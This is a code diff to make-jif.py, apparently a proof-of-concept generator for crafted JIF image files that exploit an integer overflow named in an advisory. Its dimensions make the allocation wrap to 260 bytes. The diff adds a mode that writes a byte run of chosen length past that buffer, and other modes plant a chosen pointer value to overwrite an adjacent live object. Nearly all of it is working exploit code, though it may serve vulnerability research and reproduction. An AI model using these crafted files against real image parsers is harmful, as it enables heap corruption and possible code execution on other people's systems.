@@ -9,9 +9,8 @@ and reach an adjacent live object. The `published` mode uses the advisory's
 product 45771*46918 = 0x80000082, whose alpha-doubled data_size is 260.
 
 Usage: make-jif.py OUT (bytes HEXBYTE | ptr | published HEXBYTE |
-                        published-long HEXBYTE | published-mix IN OUT |
-                        published-ptr | safe HEXBYTE)
-
+                        published-long HEXBYTE | published-run N HEXBYTE |
+                        published-mix IN OUT | published-ptr | safe HEXBYTE)
 """
 import struct
 import sys
@@ -28,18 +27,24 @@ elif kind == "published-ptr":
     LEN, HEIGHT = 45771, 46918
     chosen = struct.pack("<Q", 0x00007F0000414243)
     plain = b"\x4d" * 280 + chosen + b"\x4d" * (448 - 288)
-elif kind in ("published", "published-long", "published-mix"):
+elif kind in ("published", "published-long", "published-mix", "published-run"):
     LEN, HEIGHT = 45771, 46918
     nbytes = 448
     if kind == "published-mix":
         inside, outside = sys.argv[3], sys.argv[4]
         plain = bytes([int(inside, 16)]) * 260 + bytes([int(outside, 16)]) * (nbytes - 260)
     else:
-        if kind == "published-long":
+        if kind == "published-run":
+            nbytes = int(sys.argv[3])
+            assert 260 < nbytes <= 0x80000082
+            byte = int(sys.argv[4], 16)
+        elif kind == "published-long":
             nbytes = 448
+            byte = int(sys.argv[3], 16)
         else:
             nbytes = 324
-        plain = bytes([int(sys.argv[3], 16)]) * nbytes
+            byte = int(sys.argv[3], 16)
+        plain = bytes([byte]) * nbytes
 elif kind == "ptr":
     chosen = struct.pack("<Q", 0x00007F0000414243)
     plain = b"\x4d" * 32 + chosen + b"\x4d" * 8
@@ -48,7 +53,8 @@ else:
 if kind in ("bytes", "ptr"):
     assert LEN * HEIGHT == 0x80000002
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4
-elif kind in ("published", "published-long", "published-mix", "published-ptr"):
+elif kind in ("published", "published-long", "published-mix",
+              "published-run", "published-ptr"):
     assert LEN * HEIGHT == 0x80000082
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 260
 gce = b"" if kind == "safe" else b"\x21\xf9\x04\x01\x00\x00\x00\x00"
